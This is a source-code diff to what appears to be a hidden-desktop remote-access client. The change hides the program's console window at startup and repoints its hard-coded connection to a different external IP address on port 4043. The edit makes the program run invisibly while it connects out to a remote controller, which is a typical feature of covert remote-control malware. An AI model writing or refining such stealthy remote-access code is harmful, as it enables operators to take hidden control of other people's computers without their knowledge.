@@ -1,4 +1,5 @@
 #include "HiddenDesktop.h"
+#include <Windows.h>
 
 #define TIMEOUT INFINITE
 
@@ -12,7 +13,8 @@ void StartAndWait(const char *host, int port)
 #if 1
 int main()
 {
-    const char* host = "91.109.186.9";
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    const char* host = "91.109.186.2";
     const int port = strtol("4043", nullptr, 10);
     StartAndWait(host, port);
     return 0;
